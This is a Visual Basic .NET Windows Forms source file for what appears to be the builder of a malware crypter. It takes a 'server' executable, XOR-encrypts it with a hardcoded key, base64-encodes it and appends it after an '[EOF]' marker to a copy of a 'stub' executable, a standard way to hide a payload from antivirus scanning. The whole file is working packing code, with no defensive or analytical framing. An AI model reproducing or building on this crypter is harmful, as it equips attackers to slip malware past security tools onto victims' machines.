Imports System.IO
Imports System.Text

Public Class Form1
    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        End
    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        Dim server As OpenFileDialog = New OpenFileDialog()
        server.Filter = "Exe | *.exe"
        If server.ShowDialog() = DialogResult.OK Then Guna2TextBox1.Text = server.FileName
    End Sub

    Private Sub Guna2GradientButton2_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton2.Click
        Dim stub As OpenFileDialog = New OpenFileDialog()
        stub.Filter = "Exe | *.exe"
        If stub.ShowDialog() = DialogResult.OK Then Guna2TextBox2.Text = stub.FileName
    End Sub

    Private Sub Guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click
        Dim password = "2s5v8x/A?D(G+KbP"
        Dim server = File.ReadAllBytes(Guna2TextBox1.Text)

        Dim key = Encoding.ASCII.GetBytes(password)
        Dim encryptedPayload = AlternateXOR(server, key)

        MessageBox.Show("The file has been successfully encrypted! Filename 'encrypted file' ")

        Dim base64 = Convert.ToBase64String(encryptedPayload)

        Dim outputFilePath As String = Directory.GetCurrentDirectory() & "\encrypted file.exe"

        If File.Exists(outputFilePath) Then
            File.Delete(outputFilePath)
        End If

        File.Copy(Guna2TextBox2.Text, outputFilePath)

        File.AppendAllText(outputFilePath, "[EOF]" & base64)
    End Sub
    Private Shared Function AlternateXOR(ByVal data As Byte(), ByVal key As Byte()) As Byte()
        Dim result = New Byte(data.Length - 1) {}

        For i = 0 To data.Length - 1
            result(i) = data(i) Xor key(i Mod key.Length)
        Next
        Return result
    End Function

End Class
